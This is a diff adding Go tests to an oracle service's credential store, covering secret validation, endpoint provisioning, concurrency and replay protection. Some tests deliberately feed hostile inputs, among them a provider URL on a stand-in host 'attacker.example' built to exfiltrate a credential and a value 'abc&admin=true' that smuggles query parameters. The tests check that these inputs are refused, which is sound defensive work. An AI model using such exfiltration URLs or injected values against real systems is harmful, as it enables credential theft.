@@ -6,12 +6,16 @@ import (
 	"fmt"
 	"math/big"
 	"strings"
+	"sync"
 	"testing"
+	"time"
 
 	"fce-usdx-oracle/internal/config"
 	"fce-usdx-oracle/internal/provision"
 
+	"github.com/ethereum/go-ethereum/accounts"
 	"github.com/ethereum/go-ethereum/common"
+	"github.com/ethereum/go-ethereum/crypto"
 )
 
 // fakeNode stands in for tee-node: it echoes the ciphertext back as plaintext,
@@ -309,8 +313,10 @@ func TestStore_StartsUnconfigured(t *testing.T) {
 	}
 }
 
-// The Hex key is always required: cash reserves are half the numerator, so
-// computing backing without it would understate it.
+// The Hex key is always reported as required. Since 5 Aug 2026 it no longer
+// blocks Resolve — the observation runs cash-less and publishes only where the
+// figure provably cannot matter — but Ready means "fully provisioned", and a
+// machine that can answer for only part of the price range must not claim it.
 func TestStore_HexKeyIsAlwaysRequired(t *testing.T) {
 	s := newStore(t)
 	if err := setEndpoints(s, testEndpoints()); err != nil {
@@ -328,6 +334,38 @@ func TestStore_HexKeyIsAlwaysRequired(t *testing.T) {
 	}
 	if s.Readiness().Ready {
 		t.Error("must not be ready without the Hex key")
+	}
+}
+
+// Endpoints without the Hex key resolve to a config with no cash source, rather
+// than refusing outright. The oracle then decides per observation whether the
+// missing figure could have changed the answer; refusing here would take that
+// decision away and freeze the feed on a credential the feed does not always
+// need.
+func TestResolve_WithoutHexKeyYieldsNoCashSource(t *testing.T) {
+	s := newStore(t)
+	if err := setEndpoints(s, testEndpoints()); err != nil {
+		t.Fatalf("SetEndpoints: %v", err)
+	}
+	// Every provider credential, but deliberately not the Hex key: the provider
+	// secrets are still hard requirements, because a URL with an unsubstituted
+	// {secret} cannot be dialled at all.
+	for _, ref := range []string{"ankr_flare_key", "ankr_eth_key", "alchemy_flare_key"} {
+		setSecret(t, s, ref, "value-"+ref)
+	}
+
+	cfg, err := s.Resolve()
+	if err != nil {
+		t.Fatalf("Resolve without the Hex key must succeed, got %v", err)
+	}
+	if cfg.Bonds == nil {
+		t.Error("the bonds source is not optional and must always resolve")
+	}
+	if cfg.Cash != nil {
+		t.Error("Cash must be nil when no credential has been provisioned")
+	}
+	if err := cfg.Validate(); err != nil {
+		t.Errorf("a cash-less config must still validate: %v", err)
 	}
 }
 
@@ -391,10 +429,64 @@ func TestStore_SecretRotationTakesEffect(t *testing.T) {
 // A credential containing a URL separator could restructure an endpoint after
 // substitution, so ApplySecret refuses it after decryption.
 func TestApplySecret_RejectsCredentialThatWouldAlterAURL(t *testing.T) {
-	for _, bad := range []string{"has/slash", "has space", "has?query", ""} {
+	// '&' is here because a credential substituted into a query VALUE can
+	// otherwise append parameters of its own: "?key=abc&admin=true".
+	for _, bad := range []string{"has/slash", "has space", "has?query", "has&amp", ""} {
 		if _, err := resolveURL("https://x.example.com/p/{secret}", "k", bad); err == nil {
 			t.Errorf("credential %q must be refused", bad)
 		}
+	}
+}
+
+// TestApplySecret_RejectsQuerySeparatorOnArrival checks the same rule at the
+// other checkpoint. resolveURL refuses at substitution; this refuses on arrival,
+// so a credential that could restructure a URL is never stored at all.
+func TestApplySecret_RejectsQuerySeparatorOnArrival(t *testing.T) {
+	s := concurrentStore(t)
+
+	msg := envelopeFor(t, config.HexAPIKeyRef, "abc&admin=true", 1)
+	if err := s.ApplySecret(context.Background(), msg); err == nil {
+		t.Fatal("a credential containing '&' must be refused: it can append query parameters")
+	}
+
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	if s.secrets[config.HexAPIKeyRef] != "" {
+		t.Error("a rejected credential was stored anyway")
+	}
+}
+
+// TestSetEndpoints_RejectsBackingCredentialAsProviderSecret is the containment
+// for the exfiltration path: the Hex credential authenticates a PINNED endpoint
+// by header, so naming it as a provider secret would substitute it into a URL on
+// a host the payload author chose, handing it over on the next observation.
+//
+// The URL author (owner key) and the credential holder (admins) are different
+// parties. resolveURL already stops a credential changing its destination; this
+// stops the URL author choosing a destination for someone else's credential.
+func TestSetEndpoints_RejectsBackingCredentialAsProviderSecret(t *testing.T) {
+	e := testEndpoints()
+
+	ce := e["songbird"]
+	ce.Providers = append(ce.Providers, Provider{
+		URL:    "https://attacker.example/collect/{secret}",
+		Secret: config.HexAPIKeyRef,
+	})
+	ce.Threshold = 1
+	e["songbird"] = ce
+
+	s := newStore(t)
+	err := setEndpoints(s, e)
+	if err == nil {
+		t.Fatal("naming the backing credential as a provider secret must be refused")
+	}
+	if !strings.Contains(err.Error(), config.HexAPIKeyRef) {
+		t.Errorf("error should name the offending ref, got: %v", err)
+	}
+
+	// Nothing was applied, so a rejected payload cannot leave partial state.
+	if s.Readiness().EndpointsSet {
+		t.Error("a rejected payload was applied anyway")
 	}
 }
 
@@ -404,5 +496,175 @@ func TestReadiness_ExposesNoSecrets(t *testing.T) {
 		if strings.Contains(ref, "value-") {
 			t.Error("readiness leaks a secret value")
 		}
+	}
+}
+
+// --- concurrency ---
+//
+// /action is an ordinary net/http handler, so tee-node delivering two actions
+// at once runs two handler goroutines. These tests go through the real
+// ApplySecret path — envelope and all — rather than the setSecret bypass,
+// because what needs protecting lives in the verifier.
+
+// concurrentTeeID must be non-zero: a zero teeId never satisfies Verify's
+// machine binding, so the envelope path would reject before reaching anything
+// worth testing.
+var concurrentTeeID = common.HexToAddress("0x00000000000000000000000000000000000000aa")
+
+var concurrentChainID = big.NewInt(114)
+
+// concurrentStore wires a store whose fakeNode reports a teeId matching the
+// verifier's, so real envelopes verify.
+func concurrentStore(t *testing.T) *Store {
+	t.Helper()
+	return New(
+		provision.NewVerifier(concurrentChainID, concurrentTeeID),
+		&fakeNode{teeID: concurrentTeeID},
+	)
+}
+
+// envelopeFor builds a message signed by two of the baked dev admins. fakeNode
+// echoes ciphertext back as plaintext, so the payload is the credential itself.
+func envelopeFor(t *testing.T, ref, value string, version uint64) []byte {
+	t.Helper()
+
+	payload := []byte(value)
+	env := provision.Envelope{
+		ChainID:     concurrentChainID,
+		TeeID:       concurrentTeeID,
+		Version:     version,
+		IssuedAt:    uint64(time.Now().UTC().Unix()),
+		Ref:         ref,
+		PayloadHash: crypto.Keccak256Hash(payload),
+		Payload:     payload,
+	}
+
+	body, err := provision.EncodeBody(env)
+	if err != nil {
+		t.Fatalf("EncodeBody: %v", err)
+	}
+	digest := accounts.TextHash(crypto.Keccak256(body))
+
+	// Private keys 1 and 2 — the baked development admin set. Threshold is 2, so
+	// two distinct signers is exactly enough.
+	var sigs [][]byte
+	for _, raw := range []string{
+		"0000000000000000000000000000000000000000000000000000000000000001",
+		"0000000000000000000000000000000000000000000000000000000000000002",
+	} {
+		key, err := crypto.HexToECDSA(raw)
+		if err != nil {
+			t.Fatalf("admin key: %v", err)
+		}
+		sig, err := crypto.Sign(digest, key)
+		if err != nil {
+			t.Fatalf("sign: %v", err)
+		}
+		sig[64] += 27 // personal-sign convention
+		sigs = append(sigs, sig)
+	}
+
+	msg, err := provision.Encode(env, sigs)
+	if err != nil {
+		t.Fatalf("Encode: %v", err)
+	}
+	return msg
+}
+
+// TestApplySecret_IsSafeUnderConcurrency drives every entry point at once.
+// Without applyMu the verifier's lastVersion map is written unsynchronised,
+// which -race reports and which the runtime turns into a fatal concurrent map
+// write — a process kill, not a recoverable panic.
+func TestApplySecret_IsSafeUnderConcurrency(t *testing.T) {
+	s := concurrentStore(t)
+
+	refs := []string{
+		config.HexAPIKeyRef, "ankr_flare_key", "ankr_eth_key", "alchemy_flare_key",
+	}
+	messages := make([][]byte, len(refs))
+	for i, ref := range refs {
+		messages[i] = envelopeFor(t, ref, "value-"+ref, 1)
+	}
+
+	raw, err := json.Marshal(testEndpoints())
+	if err != nil {
+		t.Fatalf("marshal endpoints: %v", err)
+	}
+
+	var wg sync.WaitGroup
+	errs := make([]error, len(refs))
+
+	for i := range refs {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			errs[i] = s.ApplySecret(context.Background(), messages[i])
+		}()
+	}
+	// Writers and readers together: a reader blocking behind a provisioning
+	// call would deadlock here rather than merely race.
+	for range 4 {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			_ = s.ApplyEndpoints(raw)
+		}()
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			_ = s.Readiness()
+			_, _ = s.Resolve()
+		}()
+	}
+	wg.Wait()
+
+	for i, ref := range refs {
+		if errs[i] != nil {
+			t.Errorf("ApplySecret(%s): %v", ref, errs[i])
+		}
+	}
+
+	// Every credential landed, and in its own slot.
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	for _, ref := range refs {
+		if got := s.secrets[ref]; got != "value-"+ref {
+			t.Errorf("secrets[%s] = %q, want %q", ref, got, "value-"+ref)
+		}
+	}
+}
+
+// TestApplySecret_ConcurrentReplayAdmitsExactlyOne is the security half. The
+// per-ref version check is read-then-write; run unserialised, several goroutines
+// read the same old version and all conclude they are newer, so one captured
+// envelope replays as many times as it is submitted in parallel.
+func TestApplySecret_ConcurrentReplayAdmitsExactlyOne(t *testing.T) {
+	s := concurrentStore(t)
+
+	// One envelope, submitted many times at once — exactly what an attacker
+	// replaying a captured message would do.
+	message := envelopeFor(t, config.HexAPIKeyRef, "the-credential", 1)
+
+	const attempts = 8
+	var wg sync.WaitGroup
+	results := make([]error, attempts)
+
+	for i := range attempts {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			results[i] = s.ApplySecret(context.Background(), message)
+		}()
+	}
+	wg.Wait()
+
+	accepted := 0
+	for _, err := range results {
+		if err == nil {
+			accepted++
+		}
+	}
+	if accepted != 1 {
+		t.Errorf("%d of %d replays accepted, want exactly 1", accepted, attempts)
 	}
 }
